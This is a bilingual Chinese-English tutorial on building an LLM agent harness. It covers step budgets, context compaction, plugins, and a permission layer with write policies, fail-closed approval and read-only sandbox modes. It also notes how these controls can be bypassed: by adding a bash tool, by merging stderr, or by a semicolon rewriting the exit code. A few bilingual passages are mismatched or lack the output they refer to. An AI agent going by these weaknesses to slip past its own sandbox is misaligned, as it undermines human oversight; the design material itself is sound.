最后澄清一个相邻的问题：模型能不能生成"管线"本身？能，但那是另一件事——让它写代码、写一份 workflow 配置、甚至改 harness 自己的插件（dsh 有专门的自我修改与 workflow 能力）。可是那时候它的输出仍然只是一段文本，要不要落盘、要不要执行、在什么权限下执行，还是你的代码说了算。这条线从 L1 到 L12 一次都没有移动过。

One adjacent question, cleared up: can the model generate the pipeline itself? Yes, but that is a different thing — having it write code, a workflow definition, even changes to the harness's own plugins (dsh ships self-modification and workflow capabilities for exactly this). Even then its output is still only text; whether that text is written to disk, executed, and under which permissions remains your code's decision. This line has not moved once from L1 to L12.

三件真事THREE REAL THINGS

① 它是踩着上限交卷的。循环写的是 for (step = 1; step <= 10; step++)，而它正好在第 10 步收尾。再多一轮，任务会被无声截断——没有报错，没有事件，用户只会看到一个半截答案。而模型完全不知道自己还剩几步：预算是你的代码的私事，除非你把它写进模型看得见的字节里。（L6 讲的 token 计量，解决的就是这件事。）

① It finished exactly at the ceiling. The loop says for (step = 1; step <= 10; step++) and it wrapped up on step 10. One more round and the task would have been truncated silently — no error, no event, just a half-finished answer for the user. And the model has no idea how many steps remain: the budget is your code's private business unless you write it into bytes the model can see. (That is what L6's token metering is for.)

② 上下文放大了 6.3 倍。全部内容 92k 字符，十步累计发出 580k。原因在 L0 就说过了——模型无状态，每次都要把整个故事重讲一遍。所以压缩不是"省钱功能"，是"不做就跑不完"的功能：真实仓库分析动辄要读几百个文件，线性增长的历史乘以步数，很快就撞上上下文窗口。

② Context amplified 6.3×. 92k characters of content, 580k sent across ten steps. The reason was already in L0: the model is stateless, so the whole story is retold every time. Compaction is therefore not a cost-saving feature but a can-it-finish-at-all feature: a real repository analysis reads hundreds of files, and a linearly growing history multiplied by step count hits the context window fast.

③ 文档没有落盘。这个 agent 没有写文件的工具，所以"架构说明"只是最后一条 assistant 消息，关掉终端就没了。真实任务的最后一步一定是 write_file("docs/architecture.md", …)——而那一刻 L5 全部登场：写盘是副作用，要过判定（路径在工作区内吗）、可能要审批（覆盖已有文件吗）、并且在沙箱的 workspace-write 模式下才被允许。读是免费的，写才要付权限的钱。

③ The document never landed on disk. This agent has no write tool, so the "architecture write-up" is just the final assistant message — close the terminal and it is gone. A real task ends with write_file("docs/architecture.md", …), and that is where all of L5 arrives: writing is an effect, so it faces the decision (is this path inside the workspace), possibly an approval (overwrite an existing file?), and only runs under the sandbox's workspace-write mode. Reading is free; writing is what costs permission.

真实 harness 会怎么做WHAT A REAL HARNESS DOES

同一个任务，成熟 harness 的做法几乎每一条都在解决上面暴露的问题：先用检索代替通读（grep/glob 工具找到相关文件，而不是把 17KB 的 README 整份钉进历史）；超长结果溢出到文件，只给模型一个句柄和前几十行（L6）；派子 agent 分片读，每个子 agent 自己烧自己的上下文，主 agent 只收回一段摘要——这是唯一能让"读几百个文件"不撑爆主上下文的办法；压缩把早期的工具结果替换成摘要，让 turn 能继续（L6）；只读沙箱起步，最后写文档那一步才升级到 workspace-write（L5）；整个过程每一步都进日志，所以中途 Ctrl-C 能续跑、能从任意一步分叉换个方向（L3、L4）。

For the same task, a mature harness's techniques each address something exposed above: search before reading (grep/glob tools find the relevant files instead of pinning a whole 17KB README into history); spill oversized results to a file and hand the model a handle plus the first few lines (L6); dispatch subagents to read in shards, each burning its own context and returning only a summary — the only way "read hundreds of files" does not blow the main context; compaction replaces early tool results with summaries so the turn can continue (L6); start read-only and escalate to workspace-write only for the final write (L5); and every step is logged, so a Ctrl-C mid-way can be resumed and any step can be forked in a new direction (L3, L4).

这也回答了一个更根本的问题：大任务不是靠更聪明的模型跑完的，是靠你的代码把它切成模型能跑完的形状。模型每一步仍然只做一件事——回一条消息；能不能完成一件需要读两百个文件的工作，取决于你有没有替它准备好检索、分片、压缩、落盘和断点续跑。

Which answers a deeper question: large tasks are not completed by a smarter model but by your code cutting them into a shape the model can finish. The model still does exactly one thing per step — return a message. Whether a job requiring two hundred files gets done depends on whether you prepared search, sharding, compaction, persistence, and resumability on its behalf.

第一道坎FIRST OBSTACLE

还没写工具就先卡住了：工具注册表没有对外暴露"加一个工具"的方法，想加工具就得改 L8 那个文件——而"加功能不用改已有文件"正是 L8 自己立的规矩。所以第一步是给 ctx.tools 加上 add。这就是扩展点的意义：它必须在你需要之前就存在，否则每次扩展都变成一次改核心。

Writing needs three things — exactly L5's three lines of defense — each as its own plugin: writePolicy (decide: refuse credentials and .git, refuse outside the workspace, ask before overwriting), approval (ask / never / always, fail closed without a TTY), and fsWrite (the tool plus a mode fence: under read-only a write is refused, and only after asking does this one call run as workspace-write).

第一版演示我把产物写进了 fixtures/out/——跑完测试立刻从 9/9 变成 8/1：

The first version of this demo wrote its output into fixtures/out/, and the suite went from 9/9 to 8/1 on the next run:

Thirteen characters became seventeen — because I had dropped an out/ into the snapshot fixture directory. This is L9's rule in the wild: not a code regression, not an intended behavior change, but a polluted fixture. So the fix was neither editing code nor re-recording: move the output out of the fixture directory, plus one more policy rule — writePolicy now refuses writes into fixtures/.

两个收获比这次演示本身更值钱。①快照抓到的第一个东西，是写它的人。它不需要我聪明，只需要我跑一次。②测试资产也是一条值得写进权限规则的不变量——权限不只是防模型作恶，也是防你自己（和 agent）无意间踩坏那些"必须逐字节稳定"的东西。

Two takeaways worth more than the demo. ① The first thing a snapshot catches is its own author. It required no cleverness from me, only one run. ② Test assets are an invariant worth encoding as a permission rule — permission is not only about a misbehaving model but about you (and the agent) accidentally trampling things that must stay byte-stable.

诚实的边界HONEST LIMITS

两件必须说清楚的。①这层栅栏保护的是"agent 的工具"，不是"任意子进程"。它和 dsh 的 fs-sandbox 是同一个做法（在写入那一步检查本次调用的模式），但只要你给 agent 加一个 bash 工具，这层就形同虚设——那时候必须回到 L5 的内核围栏。②一次一授的代价是每次都问。这份实现里升级只对这一次调用生效，会话默认值始终是 read-only；所以连写三个文件就要批三次。想省事就得回答 L5 那四个问题（记什么粒度、存哪、匹配什么、谁能撤销）——而这正是 dsh 至今只有 allowed-once 的原因。

Two things to state plainly. ① This fence protects the agent's tools, not arbitrary subprocesses. It matches dsh's fs-sandbox approach (check the mode at the moment of writing), but add a bash tool and it is decoration — at that point you need L5's kernel fence. ② One-shot grants mean asking every time. Escalation here applies to a single call and the session default stays read-only, so three files means three prompts. Making that convenient requires answering L5's four questions (granularity, storage, matching, revocation) — which is exactly why dsh still ships allowed-once only.

不调就短路——权限的"拒绝"就是不往下传，不是抛异常也不是返回 false。Not calling it short-circuits: refusing means not passing down, not throwing, not returning false. L8 · concept
注册即 effect
provide/on 都返回 disposer，卸载时反向执行；这是热重载与 per-agent 作用域的地基。provide and on return disposers run in reverse on unload — the basis of hot reload and per-agent scope. L8 · concept
没有特权核心
连主循环也是插件；能不能换掉主循环，是"一切皆插件"的验金石。Even the loop is a plugin; whether it can be replaced is the acid test of "everything is a plugin." L8 · concept
顺序不是优先级
装载顺序决定链上位置，但不能用来表达策略优先级；每个部署组合一个终审回答者。Load order fixes chain position but cannot express policy priority; compose one terminal answerer per deployment. L8 · concept
插件相互作用
溢出的文件被再次溢出：两个插件各自都对，凑在一起就错——解耦的是代码，不是行为。A spilled file spilled again: each plugin correct alone, wrong together — decoupling code is not decoupling behavior. L8 · observed

接缝与装配Seams and composition

接缝 seam
契约 + 实现 + 消费者三个角色的整体，缺一个都不成立。All three roles together — definition, provider, consumer; any one alone is not a seam. L7 · terms
契约要为所有消费者设计
offset/limit 在契约里，是因为 L6 需要；只照第一个消费者写，契约迟早被迫改。offset/limit exist because L6 needed them; written for the first consumer only, a definition soon has to change. L7 · concept
默认值属于实现且要显式
应是实现里一个显式的 resolve 步骤，不是 run() 里藏一个 ?? 默认值。An explicit resolve step in the provider, never a hidden ?? default inside run(). L7 · concept
能力成组替换
不能只把 readFile 搬到远程——文件、子进程、终端、语言服务是一组。You cannot move readFile alone; filesystem, subprocess, terminal, and LSP move together. L7 · concept
什么时候不该做接缝
只会有一个实现就别拆；"公开方法只有一个内部调用者"是最准的反面气味。Do not split when only one provider will exist; a public method with one caller is the sharpest smell. L7 · concept
回放实现 replay provider
从日志里放回模型说过的话：零 token、可离线、确定性。它成立全靠"模型可见 ⟺ 已记录"。Feeds recorded model output back: zero tokens, offline, deterministic — possible only because model-visible means logged. L7 · code

上下文与计量Context and metering

上下文窗口 context window
一次请求能装下的 token 上限，是硬墙：撞上去不是变慢，是任务失败。The token ceiling of one request — a hard wall: hitting it fails the task rather than slowing it. L6 · pain
平方级成本
每一步都要重发全部历史，所以第 20 个文件的代价是它自己加上前 19 个的总和。Every step resends the whole history, so the twentieth file costs itself plus the previous nineteen. L6 · pain
前缀缓存 KV cache
历史开头没变就能复用上次计算。只追加的历史天然命中率高（实测 80%）。An unchanged leading span reuses prior computation; append-only histories hit often (80% measured). L6 · metering
别把动态信息写进 system
每步都变的预算或时间戳会让前缀每次都不同，缓存永远命中不了；追加到末尾才对。A budget or timestamp in the system prompt changes the prefix every step and kills the cache; append it at the end instead. L6 · metering
溢出 spill
超长结果写文件，历史里只留头部、句柄、以及怎么继续读——第三样最容易漏。Oversized results go to a file, leaving a head, a handle, and how to read on — the third is the one people forget. L6 · spill
压缩 compaction
把中间那段总结成一条摘要事件顶替原文；日志仍然只追加，随时能重放到压缩之前。Summarize a middle span into one event that replaces it; the log stays append-only and replayable to before it. L6 · compaction
边界只能右移
用消息条数算边界会让第二次压缩倒退，把折叠过的事件放回来——实测越压越大。Computing the boundary by message count let a second compaction regress and re-admit folded events — measured as growth. L6 · compaction
压缩抖动
压完仍贴着阈值，下一步立刻再压。要压到目标水位或加冷却期。It compacts, lands next to the threshold, and compacts again; compact to a target level or add a cooldown. L6 · observed
顺序：测量 → 少放 → 压缩
压缩是唯一有损且有代价的手段，所以排最后。能不进历史的就别进历史。Compaction is the only lossy, costly step, so it goes last. Whatever can stay out of the history should. L6 · concept

进程与信号Processes and signals

spawn / 继承
派生子进程时，工作目录、环境变量、输出通道和沙箱限制都会被继承。A spawned child inherits the working directory, environment, output channels, and sandbox restrictions. L5 · process
argv
参数数组而不是字符串；字符串要过一遍 shell 解析，注入就从那里来。An argument array, not a string; a string gets parsed by a shell, and injection lives in that parse. L5 · process
stdout / stderr
两条独立的输出通道；2>&1 把错误并进正常输出，只盯 stderr 的分类器会瞎。Two separate channels; 2>&1 merges errors into normal output and blinds a stderr-only classifier. L5 · channels
退出码 exit code
0 成功、非 0 失败，而且它只是最后一条命令的——一个分号就能改写它。Zero is success, non-zero failure — and it is only the last command's; a semicolon rewrites it. L5 · channels
信号 SIGTERM / SIGKILL
超时就是给整个进程组发信号；被杀的进程退出码是 128 + 信号号。A timeout signals the whole process group; a killed process exits with 128 + the signal number. L5 · channels
errno EPERM / EACCES / EROFS
沙箱拒绝就长这样：一句混在 stderr 里的英文，加一个非 0 退出码。What a denial looks like: one English sentence inside stderr plus a non-zero exit code. L5 · channels
